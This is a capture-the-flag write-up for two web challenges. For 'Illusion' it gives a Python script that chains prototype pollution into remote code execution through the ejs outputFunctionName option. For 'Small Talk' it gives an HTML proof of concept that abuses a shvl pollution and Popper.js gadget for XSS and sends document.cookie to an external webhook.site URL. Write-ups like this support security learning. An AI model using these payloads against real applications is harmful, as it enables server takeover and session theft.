# Illusion

* easy prototype pollution bypass using `constructor/prototype`
* classic RCE by ejs render option `outputFunctionName`

```python
import requests


proxies = {
    'http':'http://127.0.0.1:1080/'
}
headers = {
    'Authorization': 'Basic YWRtaW46Y2pqb3NtaGhreHhsZmRlcw=='
}
url = 'http://illusion.pwn2win.party:48110/'

r = requests.post(url + 'change_status', json = {
    'constructor/prototype/outputFunctionName':"a=1; return global.process.mainModule.constructor._load('child_process').execSync('/readflag'); //"
}, headers= headers, proxies = proxies)
r = requests.get(url, headers= headers, proxies = proxies)
print(r.text)
```

## Small Talk 

* iframe postMessage is vulnerable to race condition
* Bypass shvl and get prototype pollution with `author.__proto__.abc`
* Find a gadget of Popperjs , At first I find that `popper` can be polluted, and if `popper` is an object like `{"onmouseover":"alert(1)"}`, popperjs will execute  `setAttribute` of div which end up with `<div id="send-tooltip" role="tooltip" onmouseover="alert(1)">` 
* However, I find it impossible to trigger onmonseover event automatically (If not, plz guide me how to do that :) ). After the game it turns out that I can simply pollute another element `reference`. After reading the source code, I realiaze that `reference` refers to the button`#send-button`  while `popper` refers to the div `#send-tooltip`, which are exactly the two parmaters of `createPopper` function

https://github.com/popperjs/popper-core/blob/master/src/createPopper.js#L53-L55

So we can get xss via onblur attribute of button.

Poc:
```html
<iframe name="xss" src="https://small-talk.coach:1337/#send-button" width="800" height="800"></iframe>
<body><input id="byc" autofocus></body>
<script>
    setInterval(() => {
        xss.postMessage('{"author.__proto__.reference.onblur": "location=`https://webhook.site/0e7689bf-83ba-4293-a933-d978227cbcea/${document.cookie}`", "message": "123"}', '*');
    }, 300);
</script>
<script>
    setInterval(function(){
        document.querySelector('#byc').focus();
    }, 500)
</script>
```